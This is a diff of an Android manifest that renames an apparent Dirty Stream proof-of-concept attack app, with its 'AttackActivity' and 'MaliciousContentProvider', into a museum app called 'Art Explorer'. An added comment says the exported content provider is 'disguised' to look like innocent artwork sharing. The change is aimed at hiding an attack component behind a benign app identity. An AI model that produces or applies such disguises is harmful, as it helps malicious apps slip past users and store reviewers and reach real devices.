@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.example.dirtystream.attack"
+    package="com.artexplorer.museum"
     android:versionCode="1"
     android:versionName="1.0" >
 
@@ -8,24 +8,29 @@
         android:minSdkVersion="24"
         android:targetSdkVersion="36" />
 
+    <!-- Internet permission for loading artwork from Met Museum API -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+
     <permission
-        android:name="com.example.dirtystream.attack.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+        android:name="com.artexplorer.museum.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
         android:protectionLevel="signature" />
 
-    <uses-permission android:name="com.example.dirtystream.attack.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
+    <uses-permission android:name="com.artexplorer.museum.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
 
     <application
         android:allowBackup="true"
         android:appComponentFactory="androidx.core.app.CoreComponentFactory"
         android:extractNativeLibs="false"
-        android:icon="@android:drawable/ic_dialog_alert"
-        android:label="AttackApp"
-        android:process=":shared"
-        android:theme="@style/Theme.AppCompat.Light" >
+        android:icon="@drawable/museum_icon"
+        android:label="Art Explorer"
+        android:process=":museum"
+        android:theme="@style/MuseumTheme" >
         <activity
-            android:name="com.example.dirtystream.attack.AttackActivity"
+            android:name="com.artexplorer.museum.MuseumActivity"
             android:exported="true"
-            android:theme="@style/Theme.AppCompat.Light" >
+            android:screenOrientation="portrait"
+            android:theme="@style/MuseumTheme" >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
 
@@ -33,16 +38,17 @@
             </intent-filter>
         </activity>
 
+        <!-- Disguised content provider - looks like innocent artwork sharing -->
         <provider
-            android:name="com.example.dirtystream.attack.MaliciousContentProvider"
-            android:authorities="com.example.dirtystream.attack.provider"
+            android:name="com.artexplorer.museum.data.ArtworkContentProvider"
+            android:authorities="com.artexplorer.artexplorer.artworks"
             android:enabled="true"
             android:exported="true"
             android:grantUriPermissions="true"
-            android:process=":shared" />
+            android:process=":museum" />
         <provider
             android:name="androidx.startup.InitializationProvider"
-            android:authorities="com.example.dirtystream.attack.androidx-startup"
+            android:authorities="com.artexplorer.museum.androidx-startup"
             android:exported="false" >
             <meta-data
                 android:name="androidx.emoji2.text.EmojiCompatInitializer"
